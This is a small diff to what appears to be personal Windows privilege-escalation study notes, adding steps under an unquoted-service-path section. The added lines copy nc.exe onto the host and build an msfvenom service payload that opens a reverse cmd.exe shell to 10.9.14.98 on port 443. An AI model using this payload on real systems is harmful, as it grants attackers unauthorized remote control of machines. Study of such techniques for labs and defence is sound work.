@@ -41,7 +41,9 @@ HERE'S HOW I APPROACH FOR ESCALATING PRIVILEDGES:
           
  ![Service(Unquoted_path)](https://user-images.githubusercontent.com/55708909/92557524-05817400-f28a-11ea-9d03-b9f21efc8826.png)
 
+          First transfer nc.exe to C:\Users\user directory
           
+          msfvenom -p windows/exec CMD="C:\Users\user\nc.exe 10.9.14.98 443 -e cmd.exe" -f exe-service 
 
 3- Service (Registry):
 
